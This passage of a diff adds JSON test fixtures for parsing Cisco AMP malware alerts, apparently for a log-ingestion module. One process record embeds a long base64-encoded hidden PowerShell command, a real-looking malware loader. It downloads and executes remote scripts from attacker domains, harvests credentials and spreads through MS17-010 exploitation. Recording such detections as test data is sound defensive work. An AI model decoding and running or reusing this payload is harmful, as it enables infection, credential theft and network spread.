+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:35:01.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412622782676336645",
+        "cisco.amp.event_type_id": 553648155,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 713000000,
+        "event.action": "Retrospective Quarantine",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412622782676337000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 35306,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:35:01.000Z",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "02:2f:e0:10:03:5d"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection_id": "6412622782676336644",
+        "cisco.amp.event_type_id": 553648155,
+        "cisco.amp.file.disposition": "Malicious",
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.related.mac": [
+            "02:2f:e0:10:03:5d"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 713000000,
+        "event.action": "Retrospective Quarantine",
+        "event.category": [
+            "malware"
+        ],
+        "event.dataset": "cisco.amp",
+        "event.id": 6412622782676337000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 3,
+        "file.hash.sha256": "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446",
+        "fileset.name": "amp",
+        "host.hostname": "Demo_Qakbot_3",
+        "host.name": "Demo_Qakbot_3",
+        "input.type": "log",
+        "log.offset": 36419,
+        "related.hash": [
+            "d177e09a9ae147741a3ef8b5d3aa9c359d70d602d32f2c4bb0e2d3208cdca446"
+        ],
+        "related.hosts": [
+            "Demo_Qakbot_3"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:14:44.000Z",
+        "cisco.amp.bp_data.audit": false,
+        "cisco.amp.bp_data.details.actions": [
+            {
+                "action": "end_process",
+                "end_ts": 1602033881808,
+                "params": [
+                    "10724"
+                ],
+                "start_ts": 1602033881805,
+                "status": "success"
+            }
+        ],
+        "cisco.amp.bp_data.details.eng_epoch": 1,
+        "cisco.amp.bp_data.details.eng_ver": "0.9.0.104",
+        "cisco.amp.bp_data.details.matched_activity.events": [
+            {
+                "process:start": {
+                    "app": "powershell.exe",
+                    "app_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                    "args": [
+                        "powershell.exe",
+                        "-NoP",
+                        "-NonI",
+                        "-W",
+                        "Hidden",
+                        "-E",
+                        "JABzAGUAPQBAACgAJwB1AHAAZABhAHQAZQAuAHcAaQBuAGQAbwB3AHMAZABlAGYAZQBuAGQAZQByAGgAbwBzAHQALgBjAGwAdQBiACcALAAnAGkAbgBmAG8ALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnACwAJwA4ADcALgAxADIAMQAuADkAOAAuADIAMQA1ACcAKQANAAoAJABuAGkAYwA9ACcAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnAA0ACgBmAG8AcgBlAGEAYwBoACgAJAB0ACAAaQBuACAAJABzAGUAKQANAAoAewANAAoAIAAgACAAIAAkAHAAaQBuAD0AdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAHQADQAKACAAIAAgACAAaQBmACAAKAAkAHAAaQBuACAALQBuAGUAIAAkAG4AdQBsAGwAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABuAGkAYwA9ACQAdAANAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAkAG4AaQBjAD0AJABuAGkAYwArACIAOgA4ADAAMAAwACIADQAKACQAdgBlAHIAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAHYAZQByAC4AdAB4AHQAIgApAC4AVAByAGkAbQAoACkAIAANAAoAaQBmACgAJAB2AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAewAgAA0ACgAgACAAIAAgAGkAZgAoACQAdgBlAHIAIAAtAG4AZQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAdgBlAHIAJwBdAC4AVgBhAGwAdQBlACkAewAgAA0ACgAgACAAIAAgACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAGkAbgBmAG8ANgAuAHAAcwAxACIAKQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAADQAKACAAIAAgACAAfQAgAA0ACgB9AA0ACgAkAHMAdABpAG0AZQA9AFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AA0ACgAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgACAAIAAgACAAIAAgACAADQAKACQAZABlAGYAdQBuAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABmAHUAbgBzACkAKQANAAoAaQBlAHgAIAAkAGQAZQBmAHUAbgANAAoADQAKAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4AZgBpAGwAdABlAHIAIAAtAG4AbwB0AG0AYQB0AGMAaAAgACcAUwB5AHMAdABlAG0AIABFAHYAZQBuAHQAcwAgAEwAbwBnACcAfQAgAHwAUgBlAG0AbwB2AGUALQBXAG0AaQBPAGIAagBlAGMAdAANAAoAJABkAGkAcgBwAGEAdABoAD0AJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAKwAnAFwAcwB5AHMAdABlAG0AMwAyACcAIAAgACAADQAKAGkAZgAgACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAkAGQAaQByAHAAYQB0AGgAIAApACkAewANAAoACQAkAGQAaQByAHAAYQB0AGgAPQAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAANAAoAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgANAAoAewBzAGUAbgB0AGYAaQBsAGUAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAIAAnAHYAYwBwACcAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHIAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgB7AHMAZQBuAHQAZgBpAGwAZQAgACgAJABkAGkAcgBwAGEAdABoACsAJwBcAG0AcwB2AGMAcgAxADIAMAAuAGQAbABsACcAKQAgACcAdgBjAHIAJwB9AA0ACgANAAoAWwBhAHIAcgBhAHkAXQAkAHAAcwBpAGQAcwA9ACAAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHwAcwBvAHIAdAAgAGMAcAB1ACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAGkAZAB9AA0ACgAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKACQAZQB4AGkAcwB0AD0AJABGAGEAbABzAGUADQAKAGkAZgAgACgAJABwAHMAaQBkAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgACkADQAKAHsADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGwAaQBuAGUAIAAtAGUAcQAgACQAbgB1AGwAbAApAA0ACgAgACAAIAAgACAAIAAgACAAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAHAAcwBpAGQAcwBbADAAXQAgAC0AZQBxACAAJABsAGkAbgBlAFsALQAxAF0AKQAgAC0AYQBuAGQAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiAEUAUwBUAEEAQgBMAEkAUwBIAEUARAAiACkAIAAtAGEAbgBkACAAKAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAOAAwACAAIgApACAALQBvAHIAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQANAA0ACIAKQApACAAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQB4AGkAcwB0AD0AJAB0AHIAdQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKAEsAaQBsAGwAQgBvAHQAKAAnAGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkADQAKAGYAbwByAGUAYQBjAGgAIAAoACQAdAAgAGkAbgAgACQAdABjAHAAYwBvAG4AbgApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAaQBuAGUAIAA9ACQAdAAuAHMAcABsAGkAdAAoACcAIAAnACkAfAAgAD8AewAkAF8AfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQAoACQAbABpAG4AZQAgAC0AaQBzACAAWwBhAHIAcgBhAHkAXQApACkAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAGwAaQBuAGUAWwAtADMAXQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAJAB0AC4AYwBvAG4AdABhAGkAbgBzACgAIgBFAFMAVABBAEIATABJAFMASABFAEQAIgApACAALQBhAG4AZAAgACgAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQAxADEAMQAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADIAMgAyADIAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgAzADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA0ADQANAAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADUANQA1ADUAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA2ADYANgA2ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANwA3ADcANwAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADgAOAA4ADgAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA5ADkAOQA5ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA1ADUANgAwACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANgA1ADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANQA1ADMAMwA1ACIAKQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAdgBpAGQAPQAkAGwAaQBuAGUAWwAtADEAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAGUAdgBpAGQAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMAIAAtAGYAbwByAGMAZQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAaQBmACAAKAAhACQAZQB4AGkAcwB0ACAALQBhAG4AZAAgACgAJABwAHMAaQBkAHMALgBjAG8AdQBuAHQAIAAtAGwAZQAgADgAKQApAA0ACgB7ACAAIAAgAA0ACgAgACAAIAAgACQAYwBtAGQAbQBvAG4APQAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBXACAASABpAGQAZABlAG4AIABgACIAYAAkAG0AbwBuACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAbQBvAG4AJwBdAC4AVgBhAGwAdQBlADsAYAAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgADsAaQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAGAAJABmAHUAbgBzACkAKQApADsASQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAGAAJABSAGUAbQBvAHQAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoAGAAJABtAG8AbgAsACAAYAAkAG0AbwBuACwAIAAnAFYAbwBpAGQAJwAsACAAMAAsACAAJwAnACwAIAAnACcAKQBgACIAIgANAAoAIAAgACAAIAAkAHYAYgBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAANAAoACQAkAHYAYgBzAC4AcgB1AG4AKAAkAGMAbQBkAG0AbwBuACwAMAApACAAIAANAAoAfQANAAoADQAKACQATgBUAEwATQA9ACQARgBhAGwAcwBlAA0ACgAkAG0AaQBtAGkAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBtAGkAbQBpACcAXQAuAFYAYQBsAHUAZQAgAA0ACgAkAGEALAAgACQATgBUAEwATQA9ACAARwBlAHQALQBjAHIAZQBkAHMAIAAkAG0AaQBtAGkAIAAkAG0AaQBtAGkADQAKACAAIAAgACAAIAAgACAADQAKACQATgBlAHQAdwBvAHIAawBzACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABXAGkAbgAzADIAXwBOAGUAdAB3AG8AcgBrAEEAZABhAHAAdABlAHIAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAC0ARQBBACAAUwB0AG8AcAAgAHwAIAA/ACAAewAkAF8ALgBJAFAARQBuAGEAYgBsAGUAZAB9ACAAIAAgACAADQAKACQAaQBwAHMAdQAgAD0AIAAoAFsAVwBtAGkAQwBsAGEAcwBzAF0AIAAnAHIAbwBvAHQAXABkAGUAZgBhAHUAbAB0ADoAYwBvAHIAZQBkAHAAdQBzAHMAdgByACcAKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAnAGkAcABzAHUAJwBdAC4AVgBhAGwAdQBlACAADQAKACQAaQAxADcAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBpADEANwAnAF0ALgBWAGEAbAB1AGUADQAKACQAcwBjAGIAYQA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBzAGMAJwBdAC4AVgBhAGwAdQBlAA0ACgBbAGIAeQB0AGUAWwBdAF0AJABzAGMAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABzAGMAYgBhACkAIAAgACAAIAAgAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAE4AZQB0AHcAbwByAGsAIABpAG4AIAAkAE4AZQB0AHcAbwByAGsAcwApACAADQAKAHsAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAADQAKACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACAAPQAgACQATgBlAHQAdwBvAHIAawAuAEkAcABBAGQAZAByAGUAcwBzAFsAMABdACAAIAANAAoACQBpAGYAIAAoACQASQBQAEEAZABkAHIAZQBzAHMAIAAtAG0AYQB0AGMAaAAgACcAXgAxADYAOQAuADIANQA0ACcAKQB7AGMAbwBuAHQAaQBuAHUAZQB9ACAACQANAAoAIAAgACAAIAAkAFMAdQBiAG4AZQB0AE0AYQBzAGsAIAAgAD0AIAAkAE4AZQB0AHcAbwByAGsALgBJAFAAUwB1AGIAbgBlAHQAWwAwAF0AIAAgAA0ACgAgACAAIAAgACQAaQBwAHMAPQBHAGUAdAAtAE4AZQB0AHcAbwByAGsAUgBhAG4AZwBlACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACQAUwB1AGIAbgBlAHQATQBhAHMAawANAAoACQAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKAAkAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhACgAJABsAGkAbgBlACAALQBpAHMAIABbAGEAcgByAGEAeQBdACkAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAaQBmACAAKAAkAGwAaQBuAGUALgBjAG8AdQBuAHQAIAAtAGwAZQAgADQAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAJABpAD0AJABsAGkAbgBlAFsALQAzAF0ALgBzAHAAbABpAHQAKAAnADoAJwApAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAgACgAJABsAGkAbgBlAFsALQAyAF0AIAAtAGUAcQAgACcARQBTAFQAQQBCAEwASQBTAEgARQBEACcAKQAgAC0AYQBuAGQAIAAgACgAJABpACAALQBuAGUAIAAnADEAMgA3AC4AMAAuADAALgAxACcAKQAgAC0AYQBuAGQAIAAoACQAaQBwAHMAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcABzACsAPQAkAGkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAaQBmACAAKAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AC0AJABzAHQAaQBtAGUAKQAvADEAMAAwADAAIAAtAGcAdAAgADUANAAwADAAKQB7AGIAcgBlAGEAawB9AA0ACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAaQBwACAAaQBuACAAJABpAHAAcwApAA0ACgAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVABpAGMAawBDAG8AdQBuAHQALQAkAHMAdABpAG0AZQApAC8AMQAwADAAMAAgAC0AZwB0ACAANQA0ADAAMAApAHsAYgByAGUAYQBrAH0ADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQBwACAALQBlAHEAIAAkAEkAUABBAGQAZAByAGUAcwBzACkAewBjAG8AbgB0AGkAbgB1AGUAfQAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAGkAcAAgAC0AYwBvAHUAbgB0ACAAMQApACAALQBuAGUAIAAkAG4AdQBsAGwAIAAgAC0AYQBuAGQAIAAkAGkAcABzAHUAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQBwACkAIAANAAoAIAAgACAAIAAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAD0AMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGEALgBjAG8AdQBuAHQAIAAtAG4AZQAgADAAKQAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAkAHIAZQAgAD0AIAB0AGUAcwB0AC0AaQBwACAALQBpAHAAIAAkAGkAcAAgAC0AYwByAGUAZABzACAAJABhACAAIAAtAG4AaQBjACAAJABuAGkAYwAgAC0AbgB0AGwAbQAgACQATgBUAEwATQAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJAByAGUAIAAtAGUAcQAgADEAKQB7ACQAaQBwAHMAdQAgAD0AJABpAHAAcwB1ACAAKwAiACAAIgArACQAaQBwAH0ADQAKAAkACQAJAGUAbABzAGUADQAKAAkACQAJAHsADQAKAAkACQAJAAkAJAB2AHUAbAA9AFsAUABpAG4AZwBDAGEAcwB0AGwAZQAuAFMAYwBhAG4AbgBlAHIAcwAuAG0AMQA3AHMAYwBdADoAOgBTAGMAYQBuACgAJABpAHAAKQAJAAkACQAJAA0ACgAJAAkACQAJAGkAZgAgACgAJAB2AHUAbAAgAC0AYQBuAGQAIAAkAGkAMQA3ACAALQBuAG8AdABjAG8AbgB0AGEAaQBuAHMAIAAkAGkAcAApAA0ACgANAAoACQAJAAkACQB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwA9AGUAYgA3ACAAJABpAHAAIAAkAHMAYwANAAoACQAJAAkACQAJAGkAZgAgACgAIQAoACQAcgBlAHMAIAAtAGUAcQAgACQAdAByAHUAZQApACkADQAKAAkACQAJAAkACQB7AGUAYgA4ACAAJABpAHAAIAAkAHMAYwB9AA0ACgAJAAkACQAJAAkAJABpADEANwAgAD0AIAAkAGkAMQA3ACAAKwAgACIAIAAiACsAJABpAHAADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAIAB9ACAAIAAgACAAIAAgACAADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApACAAIAANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpAHAAcwB1ACcAIAAsACQAaQBwAHMAdQApAA0ACgAkAFMAdABhAHQAaQBjAEMAbABhAHMAcwAuAFAAdQB0ACgAKQANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpADEANwAnACAALAAkAGkAMQA3ACkADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAC4AUAB1AHQAKAApAA=="
+                    ],
